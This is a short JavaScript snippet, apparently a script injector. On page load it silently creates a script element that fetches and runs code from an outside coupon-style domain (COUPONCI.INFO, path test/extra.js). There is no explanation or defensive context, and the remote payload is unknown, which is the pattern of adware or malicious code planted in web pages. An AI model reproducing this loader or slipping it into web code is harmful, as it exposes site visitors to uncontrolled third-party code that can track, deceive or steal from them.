function addScript() {
	var s = document.createElement('script');
	s.setAttribute("type", "text/javascript");
	s.setAttribute("src", "http://COUPONCI.INFO/test/extra.js");
	var a = document.getElementsByTagName('script')[0];
	if (a == null) return false;
	a.appendChild(s);
	return true
}
addScript();